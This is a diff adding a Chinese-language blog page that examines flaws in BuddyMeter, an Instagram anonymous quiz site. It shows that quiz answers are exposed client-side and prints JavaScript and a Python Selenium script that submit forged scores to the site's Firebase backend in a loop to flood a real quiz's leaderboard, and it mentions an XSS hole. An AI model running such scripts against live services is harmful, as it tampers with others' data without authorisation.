@@ -1,0 +1,205 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:title" content="IG 匿名問答 BuddyMeter 網頁漏洞 - 茶花本" />
+    
+
+    
+    <meta property="og:image"  content="/images/10.png" />
+    
+
+    <link rel="stylesheet" href="/css/materialize.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/prettify.css">
+
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.10/css/all.css" integrity="sha384-+d0P83n9kaQMCwj8F4RJB66tzIwOKmrdb46+porD/OvrJ+37WqIM7UoBtwHO6Nlg" crossorigin="anonymous">
+
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+    
+    <script>
+    var randomNum = Math.floor(Math.random()*15);
+    function randthumbnail(){
+        return "/images/"+randomNum+".png"
+    }
+
+    function thumbnailPath(){
+        randomNum++;
+        return "/images/"+ randomNum % 15+".png";
+    }
+
+    </script>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    
+    
+        <title>IG 匿名問答 BuddyMeter 網頁漏洞 - 茶花本</title>    
+    
+    
+</head>
+
+<body onload="PR.prettyPrint()">
+    <a href="#" data-target="slide-out" class="sidenav-trigger">
+        <i class="Small material-icons">menu</i>
+    </a>
+
+    <div class="container">
+    <nav>
+      <a href="/" class="brand-logo">茶花本</a>
+      <p class="description">茶花本是烏龍派出所裡 唬爛讀者出版社 的編輯</p>
+</nav>
+
+
+<ul id="slide-out" class="sidenav">
+    <li><div class="user-view">
+        <a href="/">
+      <div class="background">
+        <img src="/images/side-bg.jpg">
+      </div>
+      <img class="circle" src="/images/avatar.png"></a>
+      <a href=""><span class="white-text name">Hank Lu</span></a>
+      <a href=""><span class="white-text email">s210215@shsh.tw</span></a>
+    </div></li>
+    <li><a href="https://github.com/" target="_blank"><i class="fab fa-github fa-2x"></i>GitHub</a></li>
+    <li><a href="https://medium.com/@luuuy" target="_blank"><i class="fab fa-medium fa-2x"></i>Medium</a></li>
+    <li><div class="divider"></div></li>
+    <li><a class="subheader center-align">CS student in TaiwanTech</a></li>
+</ul>
+  
+    <div class="row">
+    <div class="blog-post z-depth-1">
+        
+        <div class="blog-post-thumbnail">
+            
+            <a href="/buddymeter-bug/" class="blog-post-title">
+                <h1 >IG 匿名問答 BuddyMeter 網頁漏洞</h1>
+            </a>
+            
+        </div>
+
+        <!-- Content -->
+        <div class="blog-post-content">
+        <p>最近很流行的 instagram 匿名問答網站 —— Buddymetter，每個人都在測試自己是不是邊緣人，結果還真的是邊緣人= = 不過因為方便使用加上快速流行，所以還是滿多人跟風的。</p>
+<a id="more"></a> 
+<h2 id="快速得到答案"><a href="#快速得到答案" class="headerlink" title="快速得到答案"></a>快速得到答案</h2><p>這個網站其實很陽春，只要開發人員工具打開就能拿到每一題的答案了。</p>
+<img src="/buddymeter-bug/1.png" class="slug">
+<p>於是 Splitline 大大把他寫成了一個瀏覽器外掛（真是吃飽太閒= =）</p>
+<blockquote>
+<p>Chrome: <a href="https://goo.gl/y2Y259" target="_blank" rel="noopener">https://goo.gl/y2Y259</a><br>FireFox: <a href="https://goo.gl/DXhtPU" target="_blank" rel="noopener">https://goo.gl/DXhtPU</a> (支援手機版)<br>Github repo: <a href="https://github.com/splitline/buddymeter-cheater" target="_blank" rel="noopener">https://github.com/splitline/buddymeter-cheater</a></p>
+</blockquote>
+<div class="fb-video" data-href="https://www.facebook.com/StarBurstStreammm/videos/1664866433560372/" data-width="600" data-show-text="false"><blockquote cite="https://www.facebook.com/StarBurstStreammm/videos/1664866433560372/" class="fb-xfbml-parse-ignore"><a href="https://www.facebook.com/StarBurstStreammm/videos/1664866433560372/" target="_blank" rel="noopener"></a><p>垃圾網站ㄉ垃圾外掛= =<br>啊上面那ㄍ紅色按鈕就只是讓你都答對拿10分而已就是ㄌ<br><br>Chrome Extension: <a href="https://chrome.google.com/webstore/detail/buddy-meter-%E7%B0%A1%E6%98%93%E5%A4%96%E6%8E%9B/mhmkonllkaljgokjgdaelihochldlgol" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/buddy-meter-%E7%B0%A1%E6%98%93%E5%A4%96%E6%8E%9B/mhmkonllkaljgokjgdaelihochldlgol</a><br>Github Repo: <a href="https://github.com/splitline/buddymeter-cheater" target="_blank" rel="noopener">https://github.com/splitline/buddymeter-cheater</a></p>Posted by <a href="https://www.facebook.com/StarBurstStreammm" target="_blank" rel="noopener">黃志仁</a> on Sunday, May 20, 2018</blockquote></div>
+
+
+<h2 id="拆解一下"><a href="#拆解一下" class="headerlink" title="拆解一下"></a>拆解一下</h2><h3 id="打開開發人員工具觀察一下原始碼可以發現"><a href="#打開開發人員工具觀察一下原始碼可以發現" class="headerlink" title="打開開發人員工具觀察一下原始碼可以發現"></a>打開開發人員工具觀察一下原始碼可以發現</h3><ul>
+<li>用 firebase 當作資料庫</li>
+<li>有一個很長的 script element</li>
+<li>程式碼有被打亂過</li>
+</ul>
+<img src="/buddymeter-bug/3.png" class="slug">
+<h3 id="把很長的-script-複製到-SublimeText-看一看"><a href="#把很長的-script-複製到-SublimeText-看一看" class="headerlink" title="把很長的 script 複製到 SublimeText 看一看"></a>把很長的 script 複製到 SublimeText 看一看</h3><p>原來各種 function 和 variable 都藏在這裡呢(´・ω・`)，變數名稱都被打亂了，有耐心一個一個 trace 的話其實很容易發現規則。</p>
+<ul>
+<li>_0x65bd 存著很多字串，大部分的東西都和他有關。</li>
+</ul>
+<p>eg: <code>_0x65bd[27] is &quot;uid&quot;</code>, <code>_0x65bd[42] is &quot;questions&quot;</code></p>
+<ul>
+<li>score=0  只要答對一題就 ++</li>
+<li>anserer_name 使用者的名稱（Example:Nikki）</li>
+<li>question_number 目前的題數，大於總題數就會送出答案 </li>
+<li>載入頁面時從 firebase 撈題目和排行榜的資料出來。<img src="/buddymeter-bug/4.png" class="slug">
+</li>
+</ul>
+<h3 id="送出到-firebase-的-function"><a href="#送出到-firebase-的-function" class="headerlink" title="送出到 firebase 的 function"></a>送出到 firebase 的 function</h3><pre><code class="Javascript">function send_score_to_firebase(score) {
+    var _0x3d1ax37 = {};
+    _0x3d1ax37[_0x65bd[144] + pollID + _0x65bd[145] + userID + _0x65bd[146]] = answerer_name;
+    _0x3d1ax37[_0x65bd[144] + pollID + _0x65bd[145] + userID + _0x65bd[34]] = score;
+    var _0x3d1ax38 = firebase[_0x65bd[36]]()[_0x65bd[35]]();
+    _0x3d1ax38[_0x65bd[112]](_0x3d1ax37, function(_0x3d1ax14) {
+        if (_0x3d1ax14) {} else {} }) }
+</code></pre>
+<h3 id="自訂分數"><a href="#自訂分數" class="headerlink" title="自訂分數"></a>自訂分數</h3><p>這個 function 將 anserer_name 和 score 存入 firebase，我們只需要修改<code>answerer_name</code> 和 <code>score</code> 就可以達到自訂分數的效果。</p>
+<pre><code class="Javascript">anserer_name = &#39;hank&#39;
+score = 9.487  //可以是 [0,11) 的浮點數
+send_score_to_firebase(score)
+</code></pre>
+<h2 id="使用-Python-Selenium"><a href="#使用-Python-Selenium" class="headerlink" title="使用 Python + Selenium"></a>使用 Python + Selenium</h2><blockquote>
+<p>學術用途，勿傷和氣</p>
+</blockquote>
+<p>找到好玩的漏洞之後，就可以用自動化的方式來做洗版之類的事（？。</p>
+<p><strong> #selenium 可以用來模擬瀏覽器的動作 </strong></p>
+<pre><code class="python">from selenium import webdriver
+from time import sleep
+URL = &quot;https://buddymeter.com/quiz.html?q=t5CA2kC&quot; # splitline 的問卷
+
+def send_score(name,score):
+    driver = webdriver.Chrome()
+    driver.get(URL)
+    sleep(1.5) # 可能要 load data 之類的
+    driver.execute_script(
+        &quot;answerer_name=&#39;{}&#39;;send_score_to_firebase({});&quot;.format(name,score)
+    ) # 執行 Javascript
+    sleep(.5)
+    driver.close()
+
+# 刷個10次
+for i in range(10):
+    send_score(&#39;hank&#39;, 9.87) #score is [0~11)的 float
+</code></pre>
+<img src="/buddymeter-bug/5.png" class="slug">
+<h3 id="Local-Storage"><a href="#Local-Storage" class="headerlink" title="Local Storage"></a>Local Storage</h3><p>原本想要直接在 console 裡用 javascript call function 洗版，但由於每次 load 頁面時才會將 firebase 的資料存在 Local Storage ，所以一定要 clear 後 reload 才能以另一個使用者 id 出現在排行榜上，即便是無痕視窗也要手動清空才行呢(´・ω・`)。所以只好用 selenium 來解這個問題。</p>
+<h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h2><p>明明就很想要有人來回，但又不好意思，只好說跟風一下 = =</p>
+<h3 id="補充"><a href="#補充" class="headerlink" title="補充"></a>補充</h3><p style="color: red">可以 XSS 呢。</p>
+
+<p><div id="fb-root"></div></p>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = 'https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0&appId=141647639903033&autoLogAppEvents=1';
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+        </div>
+
+        <div class="fixed-action-btn">
+          <a class="btn-floating btn-large teal">
+            <i class="material-icons">add</i>
+          </a>
+          <ul>
+            <li><a class="btn-floating teal lighten-2" href="/"><i class="material-icons">home</i></a></li>
+            <li onclick="$('html,body').animate({scrollTop:0},'slow')">
+                <a class="btn-floating teal lighten-1"><i class="material-icons">keyboard_arrow_up</i></a>
+            </li>
+          </ul>
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</body>
+<script src="/js/prettify.js"></script>
+<script src="/js/materialize.js"></script>
+<script>$('pre').addClass('prettyprint linenums')</script>
+
+<script>
+    $('.blog-post-thumbnail').css("background-image", "url("+randthumbnail()+")");
+
+    $('.card-image').each(function(){
+        $(this).children().attr('src',thumbnailPath());
+    })
+</script>
+
+
+<script>
+  $(document).ready(function(){
+    $('.sidenav').sidenav();
+  });
+
+   $('.fixed-action-btn').floatingActionButton({
+    direction: 'top',
+  });
+   $('.fixed-action-btn').floatingActionButton('open');
+</script>
+</html>
